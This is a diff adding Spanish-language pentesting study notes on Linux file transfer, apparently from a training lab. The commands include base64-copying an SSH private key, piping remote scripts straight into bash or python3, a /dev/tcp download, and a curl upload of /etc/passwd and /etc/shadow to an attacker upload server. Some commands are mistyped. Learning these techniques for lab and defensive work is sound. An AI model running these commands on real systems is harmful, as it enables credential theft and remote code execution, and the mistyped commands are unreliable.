@@ -263,6 +263,164 @@ sudo python3 -m pyftpdlib --port 21 --write
  (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
+# METODOS DE TRANFERENCIA DE ARCHIVOS EN LINUX
+
+Linux es un sistema operativo versatil (el mejor), comunmente se utiliza para diferentes herramientas que nosotros usamos para llevar a cabo. Entendiendo como se transfieren archivos en linux entenderemos como los atacante y como ayudarnos como defensores.
+
+Hace unos años, nosotros contactabamos para tener respuestas a incidentes en los servidores web. Nostros buscamos multiples trucos. 
+
+EL script en Bash se como metodo para descargar una pequeña pieza de amlware para conectarnos remotamente y tener control del servidor. Una vez que usamos cURL podemos usar wget o si no pyhon.
+
+Linux puede comunicarse en FTP, SMB como Windows, muchos malware utilizan diferentes sistemas operativos usando HTTP y HTTPS para la comunicación. 
+
+## OPERADORES DE DESCARGA
+
+Nosotros tenemos acceso a una maquina, y queremos o necseitamos descargar un fichero. Vamos a ver como se haria.
+
+### BASE&$ ENCODING / DECODING
+
+Dependiendo el tamaño del fichero a transferir, nosotros usamos un metodo que no requira conexion. Si tenemos acceso a la terminal podemos encodear y copiar el contenido y asi reversivamente apra comprobarlo
+
+```
+md5sum id_rsa - chekea el archivo
+```
+Podemos usar "cat" para ver el contenido
+```
+cat id_rsa |base64 -w 0;echo
+```
+
+Nosotros copiamos el contenido y lo podemos decodificar 
+```
+echo -m 'code' | base64 -d > id_rsa
+```
+
+Y finalmente confirmamos que todo esta correcto por el hash
+```
+md5sum id_rsa
+```
+
+### DESCARGAS DE WEB POR WGET Y CURL
+
+Las mas comunes utilidades en las distribuciones de Linux es como interactua con las aplicaciones web son wget y curl. Estas herramientas estan instalar en las distribuciones de linux
+
+Para descargar una archivo usando "wget", necesitamos especificar la URL -O para un output
+```
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+```
+el curl es muy similar lo unico que la -o es en minuscula
+```
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+### FIELESS ATTACKS USANDO LINUX
+
+Por una de las formas de linux funciona, muchas herramientas que nosotros usamos en linux se usan para replicar operaciones.
+
+Vamos a utilziar el "curl" anteiormrente usando y descargarlo
+```
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+Podemos deacrgar un script en python para el servidor web.
+```
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+### DESCARGAR CON BASH /DEV/TCP
+
+En muchas situaciones deberas utilizar esta version.
+```
+exec 3<>/dev/tcp/10.10.10.32/80
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+cat <&3
+```
+
+## DESCARGAS POR SSH
+
+SSH (Secure Shell) es un protocolo de acceso seguro a los ordenadores remotamente. La implementación de ssh es con SCP
+
+SCP (Secure Copy) es una linea de comando y una utilidad en la que se copian ficheros y directorios entre host seguros. Podemos copiar nuestros ficheros localmente a servidores remotos.
+
+SCP es muy similar para "copy" o "cp" una vez que esta en una ruta local, nosotros necseitamos especificar el usuario, la IP o DNd y las credenciales
+
+Antes de descargar deveremos lanzar un servidor SSH
+
+```
+sudo systemctl enable ssh
+sudo systemctl start ssh
+netstat -lnpt
+```
+
+### DESCARGAR FICHEROS USANDO SCP
+
+```
+scp plaintext@192.168.49.128:/root/myroot.txt . 
+```
+
+## SUBIR OPERACIONES
+
+Hay muchas opciones o situaciones que podemos capturar paquetes, deberemos subir archivos del target a nuestro o viceversa.
+
+### WEB UPLOADS
+
+Anteriormente mencionado en el "windows file transfeR" podemos subir archivos al servidor con un modulo por python por ejemplo.
+
+```
+sudo python3 -m pip install -user uploadserver
+```
+
+### CREAR UN CERTIFICADO
+
+```
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+### EMPEZAR WEB SERVER
+
+```
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+vanis a subir archivos /etc/passwd y /etc/shadow
+
+### SUBIR MULTIPLES ARCHIVOS
+
+```
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+Usamos la opcion --insecure porque nosotros usamos la misma certificacion que hemos creado y es insegura
+
+### FORMAS ALTERNATIVAS DE TRANSFERIR ARCHIVOS
+
+Las distribuciones de linux usualmente usan Python o php instalado, para empezar a hacerlo, y nuestro servidor tiene un web server, podemos mover archivos qu ueramos entre directorios.
+
+Es posible que pueda usar varios lenguajes. 
+
+### CREAR UN WEB SERVER CON PYTHON3
+
+```
+python3 -m http.server puerto
+```
+### CON PHP
+```
+php -s 0.0.0.0:8000
+```
+### RUBY
+```
+ruby -run -ehttpd . -p8000
+```
+### DESCARGAR UN FICHERO DE LA MÁQUINA
+
+```
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+
+### SUBIDA DE ARCHIVOS CON SCP
+
+Muchas compañias utilan ssh (22) para las conexiones y para subir archivos necesitaremos scp
+
+```
+ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
 
 
 
